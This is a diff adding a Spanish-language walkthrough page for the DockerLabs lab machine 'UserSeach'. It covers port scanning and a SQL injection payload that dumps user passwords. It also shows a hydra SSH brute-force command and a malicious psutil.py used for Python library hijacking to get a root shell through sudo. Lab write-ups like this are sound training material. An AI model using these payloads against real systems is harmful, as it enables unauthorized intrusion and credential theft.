@@ -1,0 +1,189 @@
+---
+title: UserSeach
+description: Resolución completa de la máquina virtual *UserSeach* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **UserSeach**, desarrollada por *kvzlx* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un formulario de búsqueda vulnerable a **SQL Injection**, permitiendo la extracción de credenciales de usuarios del sistema. Con estas credenciales, se realiza un ataque de fuerza bruta contra SSH para acceder como `kvzlx`.
+Una vez dentro, se identifica que el usuario puede ejecutar un script Python como root mediante `sudo`. El script importa la librería `psutil`, y al crear un archivo `psutil.py` malicioso en el directorio de ejecución, se realiza **Library Hijacking** para obtener una shell con privilegios de `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'UserSeach',
+    Autor: 'kvzlx',
+    Dificultad: 'Media',
+    Fecha: '02/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip UserSeach.zip
+sudo bash auto_deploy.sh UserSeach.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1764901655/Ip_y0gzro.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p UserSeach/{content,exploits,nmap,scripts}
+cd UserSeach
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764901596/Ports_kjprhp.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+El escaneo no revela rutas adicionales. La página principal contiene un formulario de búsqueda:
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1764901596/Index_ur5dcu.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 SQL Injection
+
+Al probar el usuario `admin`, el sistema devuelve su contraseña directamente:
+
+![Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1764901596/Admin_w1nxr0.png)
+
+Se prueba un bypass de SQL Injection:
+
+```
+admin' OR 1=1; -- -
+```
+
+Se listan tres usuarios con sus contraseñas:
+
+![SQLi](https://res.cloudinary.com/dewqswzke/image/upload/v1764901597/SQLI_kgzmq1.png)
+
+### 2.2 Fuerza bruta SSH
+
+```bash
+hydra -L users.txt -P passwords.txt ssh://172.17.0.2
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1764901596/Hydra_ysakcx.png)
+
+```bash
+ssh kvzlx@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1764901596/SSH_gseez8.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De kvzlx → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1764901597/Sudo-l_alkxcr.png)
+
+Se puede ejecutar `/usr/bin/python3 /home/kvzlx/system_info.py` como root. El script importa `psutil`.
+
+Se crea un archivo `psutil.py` malicioso en el directorio de ejecución:
+
+```python
+import os
+os.system("/bin/bash")
+```
+
+```bash
+sudo /usr/bin/python3 /home/kvzlx/system_info.py
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764901596/Root_ajnvel.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SQL Injection en formulario de búsqueda",
+      severity: "Crítica",
+      impact: "Extracción de credenciales de usuarios"
+    },
+    {
+      vulnerability: "Reutilización de credenciales entre servicios",
+      severity: "Alta",
+      impact: "Acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en script Python",
+      severity: "Crítica",
+      impact: "Library Hijacking y escalada a root"
+    }
+  ]}
+/>
